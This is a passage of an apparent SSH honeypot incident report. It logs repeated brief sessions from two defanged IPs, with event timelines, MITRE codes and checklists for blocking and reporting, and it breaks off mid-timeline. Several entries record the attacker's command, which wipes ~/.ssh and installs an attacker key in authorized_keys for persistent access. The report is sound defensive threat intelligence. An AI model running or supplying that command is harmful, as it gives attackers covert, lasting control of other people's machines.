| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:17:39` | `cowrie.session.connect` |
| `2026-06-08 10:17:39` | `cowrie.client.version` |
| `2026-06-08 10:17:39` | `cowrie.client.kex` |
| `2026-06-08 10:17:39` | `cowrie.login.success` |
| `2026-06-08 10:17:40` | `cowrie.session.params` |
| `2026-06-08 10:17:40` | `cowrie.command.input` |
| `2026-06-08 10:17:40` | `cowrie.command.failed` |
| `2026-06-08 10:17:40` | `cowrie.log.closed` |
| `2026-06-08 10:17:41` | `cowrie.session.params` |
| `2026-06-08 10:17:41` | `cowrie.command.input` |
| `2026-06-08 10:17:41` | `cowrie.session.file_download` |
| `2026-06-08 10:17:41` | `cowrie.log.closed` |
| `2026-06-08 10:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d40f641784

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-06-08 10:17 |
| **Last Seen** | 2026-06-08 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:17:43` | `cowrie.session.connect` |
| `2026-06-08 10:17:43` | `cowrie.client.version` |
| `2026-06-08 10:17:44` | `cowrie.client.kex` |
| `2026-06-08 10:17:44` | `cowrie.login.success` |
| `2026-06-08 10:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca590b9b3128

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:20 |
| **Last Seen** | 2026-06-08 10:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:20:23` | `cowrie.session.connect` |
| `2026-06-08 10:20:23` | `cowrie.client.version` |
| `2026-06-08 10:20:23` | `cowrie.client.kex` |
| `2026-06-08 10:20:23` | `cowrie.login.success` |
| `2026-06-08 10:20:24` | `cowrie.session.params` |
| `2026-06-08 10:20:24` | `cowrie.command.input` |
| `2026-06-08 10:20:24` | `cowrie.command.failed` |
| `2026-06-08 10:20:24` | `cowrie.log.closed` |
| `2026-06-08 10:20:24` | `cowrie.session.params` |
| `2026-06-08 10:20:24` | `cowrie.command.input` |
| `2026-06-08 10:20:24` | `cowrie.session.file_download` |
| `2026-06-08 10:20:24` | `cowrie.log.closed` |
| `2026-06-08 10:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3294432200a

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:20 |
| **Last Seen** | 2026-06-08 10:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:20:25` | `cowrie.session.connect` |
| `2026-06-08 10:20:25` | `cowrie.client.version` |
| `2026-06-08 10:20:25` | `cowrie.client.kex` |
| `2026-06-08 10:20:25` | `cowrie.login.success` |
| `2026-06-08 10:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e806b4f1e844

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:22 |
| **Last Seen** | 2026-06-08 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:22:24` | `cowrie.session.connect` |
| `2026-06-08 10:22:24` | `cowrie.client.version` |
| `2026-06-08 10:22:24` | `cowrie.client.kex` |
| `2026-06-08 10:22:24` | `cowrie.login.success` |
| `2026-06-08 10:22:24` | `cowrie.session.params` |
| `2026-06-08 10:22:24` | `cowrie.command.input` |
| `2026-06-08 10:22:24` | `cowrie.command.failed` |
| `2026-06-08 10:22:24` | `cowrie.log.closed` |
| `2026-06-08 10:22:24` | `cowrie.session.params` |
| `2026-06-08 10:22:24` | `cowrie.command.input` |
| `2026-06-08 10:22:24` | `cowrie.session.file_download` |
| `2026-06-08 10:22:24` | `cowrie.log.closed` |
| `2026-06-08 10:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b82857b08b62

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:22 |
| **Last Seen** | 2026-06-08 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:22:25` | `cowrie.session.connect` |
| `2026-06-08 10:22:25` | `cowrie.client.version` |
| `2026-06-08 10:22:25` | `cowrie.client.kex` |
| `2026-06-08 10:22:26` | `cowrie.login.success` |
| `2026-06-08 10:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1965213857b3

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:24 |
| **Last Seen** | 2026-06-08 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:24:27` | `cowrie.session.connect` |
| `2026-06-08 10:24:27` | `cowrie.client.version` |
| `2026-06-08 10:24:27` | `cowrie.client.kex` |
| `2026-06-08 10:24:27` | `cowrie.login.success` |
| `2026-06-08 10:24:27` | `cowrie.session.params` |
| `2026-06-08 10:24:27` | `cowrie.command.input` |
| `2026-06-08 10:24:27` | `cowrie.command.failed` |
| `2026-06-08 10:24:27` | `cowrie.log.closed` |
| `2026-06-08 10:24:27` | `cowrie.session.params` |
| `2026-06-08 10:24:27` | `cowrie.command.input` |
| `2026-06-08 10:24:27` | `cowrie.session.file_download` |
| `2026-06-08 10:24:27` | `cowrie.log.closed` |
| `2026-06-08 10:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ff120ef326

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:24 |
| **Last Seen** | 2026-06-08 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:24:28` | `cowrie.session.connect` |
| `2026-06-08 10:24:28` | `cowrie.client.version` |
| `2026-06-08 10:24:28` | `cowrie.client.kex` |
| `2026-06-08 10:24:29` | `cowrie.login.success` |
| `2026-06-08 10:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebcfc8a83de8

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:26 |
| **Last Seen** | 2026-06-08 10:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:26:34` | `cowrie.session.connect` |
| `2026-06-08 10:26:34` | `cowrie.client.version` |
| `2026-06-08 10:26:34` | `cowrie.client.kex` |
| `2026-06-08 10:26:34` | `cowrie.login.success` |
| `2026-06-08 10:26:34` | `cowrie.session.params` |
| `2026-06-08 10:26:34` | `cowrie.command.input` |
| `2026-06-08 10:26:34` | `cowrie.command.failed` |
| `2026-06-08 10:26:34` | `cowrie.log.closed` |
| `2026-06-08 10:26:34` | `cowrie.session.params` |
| `2026-06-08 10:26:34` | `cowrie.command.input` |
| `2026-06-08 10:26:34` | `cowrie.session.file_download` |
| `2026-06-08 10:26:34` | `cowrie.log.closed` |
| `2026-06-08 10:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ffa88d6befd

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:26 |
| **Last Seen** | 2026-06-08 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:26:36` | `cowrie.session.connect` |
| `2026-06-08 10:26:36` | `cowrie.client.version` |
| `2026-06-08 10:26:36` | `cowrie.client.kex` |
| `2026-06-08 10:26:36` | `cowrie.login.success` |
| `2026-06-08 10:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f953f11f564

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:30 |
| **Last Seen** | 2026-06-08 10:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:30:29` | `cowrie.session.connect` |
| `2026-06-08 10:30:29` | `cowrie.client.version` |
| `2026-06-08 10:30:29` | `cowrie.client.kex` |
| `2026-06-08 10:30:29` | `cowrie.login.success` |
| `2026-06-08 10:30:29` | `cowrie.session.params` |
| `2026-06-08 10:30:29` | `cowrie.command.input` |
| `2026-06-08 10:30:29` | `cowrie.command.failed` |
| `2026-06-08 10:30:29` | `cowrie.log.closed` |
| `2026-06-08 10:30:29` | `cowrie.session.params` |
| `2026-06-08 10:30:29` | `cowrie.command.input` |
| `2026-06-08 10:30:29` | `cowrie.session.file_download` |
| `2026-06-08 10:30:29` | `cowrie.log.closed` |
| `2026-06-08 10:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-466883c3e09e

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:30 |
| **Last Seen** | 2026-06-08 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:30:30` | `cowrie.session.connect` |
| `2026-06-08 10:30:30` | `cowrie.client.version` |
| `2026-06-08 10:30:30` | `cowrie.client.kex` |
| `2026-06-08 10:30:30` | `cowrie.login.success` |
| `2026-06-08 10:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a59617e8fb

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:34 |
| **Last Seen** | 2026-06-08 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:34:20` | `cowrie.session.connect` |
| `2026-06-08 10:34:20` | `cowrie.client.version` |
| `2026-06-08 10:34:20` | `cowrie.client.kex` |
| `2026-06-08 10:34:20` | `cowrie.login.success` |
| `2026-06-08 10:34:20` | `cowrie.session.params` |
| `2026-06-08 10:34:20` | `cowrie.command.input` |
| `2026-06-08 10:34:20` | `cowrie.command.failed` |
| `2026-06-08 10:34:20` | `cowrie.log.closed` |
| `2026-06-08 10:34:20` | `cowrie.session.params` |
| `2026-06-08 10:34:20` | `cowrie.command.input` |
| `2026-06-08 10:34:20` | `cowrie.session.file_download` |
| `2026-06-08 10:34:20` | `cowrie.log.closed` |
| `2026-06-08 10:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb2538bdb7bd

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:34 |
| **Last Seen** | 2026-06-08 10:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:34:21` | `cowrie.session.connect` |
| `2026-06-08 10:34:21` | `cowrie.client.version` |
| `2026-06-08 10:34:21` | `cowrie.client.kex` |
| `2026-06-08 10:34:21` | `cowrie.login.success` |
| `2026-06-08 10:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-822d8c2e336a

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:36 |
| **Last Seen** | 2026-06-08 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:36:19` | `cowrie.session.connect` |
| `2026-06-08 10:36:19` | `cowrie.client.version` |
| `2026-06-08 10:36:19` | `cowrie.client.kex` |
| `2026-06-08 10:36:19` | `cowrie.login.success` |
| `2026-06-08 10:36:19` | `cowrie.session.params` |
| `2026-06-08 10:36:19` | `cowrie.command.input` |
| `2026-06-08 10:36:19` | `cowrie.command.failed` |
| `2026-06-08 10:36:19` | `cowrie.log.closed` |
| `2026-06-08 10:36:19` | `cowrie.session.params` |
| `2026-06-08 10:36:19` | `cowrie.command.input` |
| `2026-06-08 10:36:19` | `cowrie.session.file_download` |
| `2026-06-08 10:36:19` | `cowrie.log.closed` |
| `2026-06-08 10:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3abf7154afe6

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:36 |
| **Last Seen** | 2026-06-08 10:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:36:21` | `cowrie.session.connect` |
| `2026-06-08 10:36:21` | `cowrie.client.version` |
| `2026-06-08 10:36:21` | `cowrie.client.kex` |
| `2026-06-08 10:36:21` | `cowrie.login.success` |
| `2026-06-08 10:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a4c194876e

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 10:38 |
| **Last Seen** | 2026-06-08 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 10:38:19` | `cowrie.session.connect` |
| `2026-06-08 10:38:19` | `cowrie.client.version` |
| `2026-06-08 10:38:19` | `cowrie.client.kex` |
| `2026-06-08 10:38:20` | `cowrie.login.success` |
| `2026-06-08 10:38:20` | `cowrie.session.params` |
| `2026-06-08 10:38:20` | `cowrie.command.input` |
